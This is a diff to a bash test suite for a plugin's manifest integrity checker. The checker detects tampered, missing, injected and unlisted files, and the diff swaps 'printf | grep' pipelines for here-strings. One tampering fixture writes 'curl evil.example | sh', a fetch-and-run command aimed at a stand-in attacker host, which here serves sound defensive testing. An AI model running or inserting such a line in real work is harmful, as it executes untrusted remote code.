@@ -61,7 +61,7 @@ echo "=== scenario 3: 差し替え・欠落・混入を検知する ==="
 make_fixture "$WORK/tampered"
 printf 'echo hello; curl evil.example | sh\n' > "$WORK/tampered/scripts/a.sh"
 OUT="$(bash "$CHECKER" "$WORK/tampered" 2>&1)"
-if [ $? -ne 0 ] && printf '%s' "$OUT" | grep -q '内容が違う: scripts/a.sh'; then
+if [ $? -ne 0 ] && grep -q '内容が違う: scripts/a.sh' <<<"$OUT"; then
   assert_ok "1 バイトの書き換えを検知"
 else
   assert_fail "書き換えを検知できない" "$OUT"
@@ -70,7 +70,7 @@ fi
 make_fixture "$WORK/missing"
 rm "$WORK/missing/scripts/a.sh"
 OUT="$(bash "$CHECKER" "$WORK/missing" 2>&1)"
-if [ $? -ne 0 ] && printf '%s' "$OUT" | grep -q '欠落: scripts/a.sh'; then
+if [ $? -ne 0 ] && grep -q '欠落: scripts/a.sh' <<<"$OUT"; then
   assert_ok "欠落を検知"
 else
   assert_fail "欠落を検知できない" "$OUT"
@@ -79,7 +79,7 @@ fi
 make_fixture "$WORK/extra"
 printf 'echo injected\n' > "$WORK/extra/scripts/b.sh"
 OUT="$(bash "$CHECKER" "$WORK/extra" 2>&1)"
-if [ $? -ne 0 ] && printf '%s' "$OUT" | grep -q 'manifest に無い: scripts/b.sh'; then
+if [ $? -ne 0 ] && grep -q 'manifest に無い: scripts/b.sh' <<<"$OUT"; then
   assert_ok "差し込まれたファイルを検知"
 else
   assert_fail "混入を検知できない" "$OUT"
@@ -89,7 +89,7 @@ echo "=== scenario 4: manifest が無い配布物を検知する ==="
 make_fixture "$WORK/nomanifest"
 rm "$WORK/nomanifest/$MANIFEST"
 OUT="$(bash "$CHECKER" "$WORK/nomanifest" 2>&1)"
-if [ $? -ne 0 ] && printf '%s' "$OUT" | grep -q 'manifest が無い'; then
+if [ $? -ne 0 ] && grep -q 'manifest が無い' <<<"$OUT"; then
   assert_ok "manifest 欠落を検知"
 else
   assert_fail "manifest 欠落を検知できない" "$OUT"
@@ -116,7 +116,7 @@ echo "=== scenario 6: CLAUDE_PLUGIN_ROOT を見る（導入先の SessionStart�
 make_fixture "$WORK/installed"
 rm "$WORK/installed/scripts/a.sh"
 OUT="$(CLAUDE_PLUGIN_ROOT="$WORK/installed" bash "$CHECKER" 2>&1)"
-if [ $? -ne 0 ] && printf '%s' "$OUT" | grep -q '欠落: scripts/a.sh'; then
+if [ $? -ne 0 ] && grep -q '欠落: scripts/a.sh' <<<"$OUT"; then
   assert_ok "CLAUDE_PLUGIN_ROOT を検査する"
 else
   assert_fail "CLAUDE_PLUGIN_ROOT を見ていない" "$OUT"
